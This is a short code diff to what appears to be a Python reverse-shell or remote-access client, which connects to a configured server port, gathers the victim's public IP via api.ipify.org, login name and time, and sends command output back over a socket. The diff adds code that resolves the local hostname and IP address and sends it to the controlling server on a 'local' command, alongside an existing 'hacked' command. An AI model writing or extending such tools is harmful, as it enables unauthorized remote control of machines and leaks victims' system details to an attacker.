@@ -13,8 +13,11 @@ SERVER_PORT = 8080 #your server port
 server = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
 
 ip = get('https://api.ipify.org').text
-#test2 = socket.gethostname()
-#test = socket.gethostbyname(hostname)
+# Get the hostname
+hostname = socket.gethostname()
+
+# Resolve the hostname to an IP address
+ip_address = socket.gethostbyname(hostname)
 now = datetime.datetime.now()
 user = os.getlogin()
 s = socket.socket()
@@ -33,6 +36,10 @@ while True:
         s.send(output.encode())
         #s.send(f"""
 #{Colors.green}FINISHED{Colors.white}""".encode())
+
+
+    if command.lower()=="local":
+        s.send(ip_address.encode())
 
     if command.lower() == "hacked":
         print(f"{Colors.green}CHAT OPENED")
